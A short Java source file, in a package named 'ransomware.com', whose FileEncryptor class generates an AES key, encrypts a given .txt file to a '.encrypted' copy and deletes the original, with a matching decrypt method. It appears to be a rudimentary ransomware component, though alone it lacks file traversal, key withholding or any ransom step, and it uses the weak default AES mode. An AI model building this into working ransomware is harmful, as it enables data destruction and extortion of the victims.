package ransomware.com;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.security.NoSuchAlgorithmException;

public class FileEncryptor {

    private SecretKey secretKey;

    // Generate a new AES key
    public void generateKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        this.secretKey = keyGen.generateKey();
    }

    // Encrypt a .txt file and convert it to .encrypted file
    public void encryptFile(String filePath) throws Exception {
        Path inputPath = Paths.get(filePath);

        // Check if the file is already encrypted
        if (filePath.endsWith(".encrypted")) {
            System.out.println("File is already encrypted.");
            return;
        }

        byte[] fileData = Files.readAllBytes(inputPath);

        // Initialize the cipher for encryption
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        // Encrypt the data
        byte[] encryptedData = cipher.doFinal(fileData);

        // Create the new file path with .encrypted extension
        Path encryptedFilePath = Paths.get(filePath.replace(".txt", ".encrypted"));
        Files.write(encryptedFilePath, encryptedData);

        // Delete the original .txt file
        Files.delete(inputPath);
        System.out.println("File encrypted successfully: " + encryptedFilePath);
    }

    // Decrypt an .encrypted file and convert it back to a .txt file
    public void decryptFile(String encryptedFilePath, SecretKey secretKey) throws Exception {
        Path inputPath = Paths.get(encryptedFilePath);

        // Check if the file is already decrypted
        if (encryptedFilePath.endsWith(".txt")) {
            System.out.println("File is already decrypted.");
            return;
        }

        byte[] encryptedData = Files.readAllBytes(inputPath);

        // Initialize the cipher for decryption
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);

        // Decrypt the data
        byte[] decryptedData = cipher.doFinal(encryptedData);

        // Create the new file path with .txt extension
        String originalFilePath = encryptedFilePath.replace(".encrypted", ".txt");
        Path decryptedFilePath = Paths.get(originalFilePath);
        Files.write(decryptedFilePath, decryptedData);

        // Delete the original .encrypted file
        Files.delete(inputPath);
        System.out.println("File decrypted successfully: " + decryptedFilePath);
    }

    // Getters and setters for the secret key
    public SecretKey getSecretKey() {
        return this.secretKey;
    }

    public void setSecretKey(SecretKey secretKey) {
        this.secretKey = secretKey;
    }
}
